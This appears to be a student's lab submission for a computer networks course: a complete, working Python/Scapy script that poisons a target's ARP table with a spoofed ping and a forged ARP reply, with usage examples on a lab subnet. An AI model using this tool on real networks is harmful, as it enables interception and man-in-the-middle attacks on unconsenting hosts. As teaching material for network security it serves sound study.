#!/usr/bin/env python3
# ==============================================================================
# File Name:     arp_spoof.py
# Author:        Eva Tate and Giselle Wu
# Course:        CS60: Computer Networks
# Assignment:    Lab 1: Packet sniffing and spoofing
# Date:          September 29, 2026
#
# Description:   Building blocks for the ARP poisoning attack described in
#                Lab 1, Exercise 4, steps 1-2: a spoofed ping that creates
#                an incomplete ARP entry on the target, and a spoofed ARP
#                reply that resolves it to the attacker's MAC address.
#
# ==============================================================================

"""Single-target ARP poisoning tool using Scapy.

Usage:
    sudo python3 arp_spoof.py ping  <iface> <target_ip> <target_mac> <spoof_ip>
    sudo python3 arp_spoof.py reply <iface> <target_ip> <target_mac> <spoof_ip>
    sudo python3 arp_spoof.py both  <iface> <target_ip> <target_mac> <spoof_ip>

`ping` and `reply` run just one half of the attack each, so you can run
`arp -n` on the target in between and actually see the incomplete entry
before it gets resolved. `both` runs the full sequence with a 1s pause,
for convenience once you've already observed the two steps separately.

Example (attacker poisons Host A's table so that 10.9.0.7 maps to the
attacker's own MAC):
    sudo python3 arp_spoof.py ping  br-abc123 10.9.0.5 02:42:0a:09:00:05 10.9.0.7
    # now check `arp -n` on Host A -- 10.9.0.7 should show up as incomplete
    sudo python3 arp_spoof.py reply br-abc123 10.9.0.5 02:42:0a:09:00:05 10.9.0.7
    # now check `arp -n` on Host A again -- 10.9.0.7 should map to the attacker's MAC
"""

import sys
import time

from scapy.arch import get_if_hwaddr
from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sendp

SLEEP_BETWEEN_PING_AND_REPLY = 1  # seconds


def spoof_ping(iface, attacker_mac, target_mac, target_ip, spoof_ip):
    """Send an ICMP echo request at layer 2 with a forged source IP.

    This causes the target to notice a "new" IP address (spoof_ip) and
    create an incomplete entry for it in its ARP table (it knows the IP
    exists but not yet the MAC, since it hasn't seen an ARP reply).
    """
    pkt = Ether(src=attacker_mac, dst=target_mac) / IP(src=spoof_ip, dst=target_ip) / ICMP()
    sendp(pkt, iface=iface, verbose=0)


def spoof_arp_reply(iface, attacker_mac, target_mac, target_ip, spoof_ip):
    """Send an unsolicited ARP reply claiming spoof_ip is-at attacker_mac.

    Because ARP replies are not authenticated, the target will accept this
    and update (or, per the incomplete entry from spoof_ping, complete)
    its ARP table entry for spoof_ip to point at the attacker's MAC.
    """
    pkt = Ether(src=attacker_mac, dst=target_mac) / ARP(
        op=2,  # is-at (reply)
        hwsrc=attacker_mac,
        psrc=spoof_ip,
        hwdst=target_mac,
        pdst=target_ip,
    )
    sendp(pkt, iface=iface, verbose=0)


def poison(iface, attacker_mac, target_mac, target_ip, spoof_ip, sleep_sec=SLEEP_BETWEEN_PING_AND_REPLY):
    spoof_ping(iface, attacker_mac, target_mac, target_ip, spoof_ip)
    # The target only *updates* an existing ARP entry on a reply, it never
    # creates one from a reply alone. The ping above must arrive first and
    # be processed (creating the incomplete entry) before the reply below
    # arrives, or the reply is silently ignored.
    time.sleep(sleep_sec)
    spoof_arp_reply(iface, attacker_mac, target_mac, target_ip, spoof_ip)


def main():
    if len(sys.argv) != 6 or sys.argv[1] not in ("ping", "reply", "both"):
        print(f"Usage: sudo python3 {sys.argv[0]} <ping|reply|both> <iface> <target_ip> <target_mac> <spoof_ip>")
        sys.exit(1)

    step, iface, target_ip, target_mac, spoof_ip = sys.argv[1:6]
    attacker_mac = get_if_hwaddr(iface)
    print(f"[*] Attacker MAC on {iface}: {attacker_mac}")

    if step == "ping":
        print(f"[1] Sending spoofed ping: src={spoof_ip} -> dst={target_ip} (creates incomplete ARP entry)")
        spoof_ping(iface, attacker_mac, target_mac, target_ip, spoof_ip)
        print(f"[*] Done. Check `arp -n` on {target_ip} now -- expect an INCOMPLETE entry for {spoof_ip}.")

    elif step == "reply":
        print(f"[2] Sending spoofed ARP reply: {spoof_ip} is-at {attacker_mac}")
        spoof_arp_reply(iface, attacker_mac, target_mac, target_ip, spoof_ip)
        print(f"[*] Done. Check `arp -n` on {target_ip} now -- {spoof_ip} should map to {attacker_mac}.")

    else:  # both
        print(f"[1] Sending spoofed ping: src={spoof_ip} -> dst={target_ip} (creates incomplete ARP entry)")
        spoof_ping(iface, attacker_mac, target_mac, target_ip, spoof_ip)
        print(f"[*] Sleeping {SLEEP_BETWEEN_PING_AND_REPLY}s before the ARP reply")
        time.sleep(SLEEP_BETWEEN_PING_AND_REPLY)
        print(f"[2] Sending spoofed ARP reply: {spoof_ip} is-at {attacker_mac}")
        spoof_arp_reply(iface, attacker_mac, target_mac, target_ip, spoof_ip)
        print(f"[*] Done. Verify with `arp -n` on {target_ip}.")


if __name__ == "__main__":
    main()
